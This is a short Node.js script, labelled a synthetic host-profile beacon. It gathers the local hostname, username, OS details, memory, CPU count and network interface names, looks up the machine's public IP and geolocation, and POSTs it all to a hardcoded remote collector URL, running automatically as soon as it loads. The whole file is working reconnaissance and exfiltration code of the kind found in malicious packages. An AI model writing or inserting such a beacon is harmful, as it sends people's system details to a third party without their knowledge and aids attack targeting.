// Synthetic host-profile beacon: inventory plus public-IP discovery
// POSTed with Axios to a hardcoded remote URL.
const axios = require('axios');
const os = require('os');

async function report(url) {
  const profile = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    totalmem: os.totalmem(),
    cpus: os.cpus().length,
    nets: Object.keys(os.networkInterfaces())
  };
  const ipServices = [
    'https://api.ipify.org?format=text',
    'https://checkip.amazonaws.com',
    'https://ipv4.icanhazip.com'
  ];
  let ip = 'no_public_ip';
  for (const svc of ipServices) {
    try {
      ip = (await axios.get(svc, { timeout: 3000 })).data.trim();
      if (ip) break;
    } catch (e) {
      continue;
    }
  }
  const geo = await axios
    .get('https://ipapi.co/' + ip + '/json/')
    .then((r) => r.data);
  await axios.post(url, { ...profile, ip, country: geo.country });
}

report('https://ingest-07.example-ops.net/report');
